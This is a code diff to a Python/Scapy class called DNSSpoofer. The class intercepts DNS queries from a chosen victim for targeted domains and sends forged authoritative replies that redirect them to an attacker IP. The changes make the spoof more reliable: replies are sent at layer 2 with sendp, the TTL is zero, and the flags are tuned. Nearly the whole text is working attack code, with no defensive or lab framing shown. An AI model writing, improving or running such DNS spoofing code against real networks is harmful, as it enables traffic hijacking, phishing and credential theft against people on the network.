@@ -93,19 +93,25 @@ class DNSSpoofer:
             udp_layer = packet[UDP]
             dns_layer = packet[DNS]
             
-            # Build response: swap source/destination
+            # Get source/dest MACs from the sniffed packet
+            eth_layer = packet[Ether]
+            
+            # Build response at Layer 2 (Ethernet) level
+            # Swap source/destination for proper response
             response = (
-                Ether(dst=packet[Ether].src, src=packet[Ether].dst) /
-                IP(dst=ip_layer.src, src=self.attacker_ip) /
+                Ether(dst=eth_layer.src, src=eth_layer.dst) /
+                IP(dst=ip_layer.src, src=self.attacker_ip, ttl=64) /
                 UDP(dport=udp_layer.sport, sport=53) /
                 DNS(
                     id=dns_layer.id,
-                    qr=1,  # Response
-                    aa=1,  # Authoritative answer
-                    rd=0,
-                    ra=0,
-                    z=0,
-                    rcode=0,  # No error
+                    qr=1,        # Response (not a query)
+                    opcode=0,    # Standard query
+                    aa=1,        # Authoritative answer
+                    tc=0,        # No truncation
+                    rd=0,        # No recursion desired
+                    ra=1,        # Recursion available
+                    z=0,         # Reserved
+                    rcode=0,     # No error
                     qdcount=1,
                     ancount=1,
                     nscount=0,
@@ -113,9 +119,9 @@ class DNSSpoofer:
                     qd=DNSQR(qname=query_name),
                     an=DNSRR(
                         rrname=query_name,
-                        type=1,  # A record
-                        rclass=1,  # IN
-                        ttl=10,  # Short TTL
+                        type=1,      # A record (IPv4)
+                        rclass=1,    # IN (Internet)
+                        ttl=0,       # TTL = 0 for immediate expiration
                         rdata=self.attacker_ip
                     )
                 )
@@ -132,11 +138,12 @@ class DNSSpoofer:
             if not packet.haslayer(DNS):
                 return
             
-            # Get IP layer for victim filtering
+            # Get IP layer for victim filtering and logging
             if not packet.haslayer(IP):
                 return
             
             source_ip = packet[IP].src
+            dest_ip = packet[IP].dst
             
             # If victim_ip is specified, only respond to queries from that victim
             if self.victim_ip:
@@ -146,7 +153,7 @@ class DNSSpoofer:
             dns_layer = packet[DNS]
             
             # Only process queries (not responses)
-            if dns_layer.qr == 0:  # Query
+            if dns_layer.qr == 0:  # Query (qr=0)
                 # Extract domain name
                 if dns_layer.qd:
                     query_name = dns_layer.qd.qname.decode('utf-8')
@@ -154,18 +161,22 @@ class DNSSpoofer:
                     # Check if it's one of our target domains
                     if self._is_target_domain(query_name):
                         victim_info = f"from {self.victim_ip}" if self.victim_ip else f"from {source_ip}"
-                        self.logger.info(f"🎯 Intercepted DNS query {victim_info} for {query_name}")
+                        self.logger.info(f"🎯 INTERCEPTED DNS query {victim_info} for {query_name}")
                         
-                        # Create and send fake response
+                        # Create and send fake response using sendp() for Layer 2
                         fake_response = self._create_fake_dns_response(packet, query_name)
                         if fake_response:
                             try:
-                                from scapy.all import send
-                                send(fake_response, verbose=False, iface=self.interface)
+                                from scapy.all import sendp
+                                # Use sendp for Layer 2 (Ethernet) to ensure delivery
+                                sendp(fake_response, iface=self.interface, verbose=False)
                                 self.packets_spoofed += 1
-                                self.logger.info(f"✅ Sent fake DNS response: {query_name} → {self.attacker_ip}")
+                                self.logger.info(
+                                    f"✅ DNS SPOOF SENT: {source_ip} asked for {query_name} → "
+                                    f"replied with {self.attacker_ip} (TTL=0)"
+                                )
                             except Exception as send_err:
-                                self.logger.error(f"Error sending DNS response: {send_err}")
+                                self.logger.error(f"❌ Error sending DNS response: {send_err}")
         
         except Exception as e:
             self.logger.error(f"Error in packet callback: {e}")
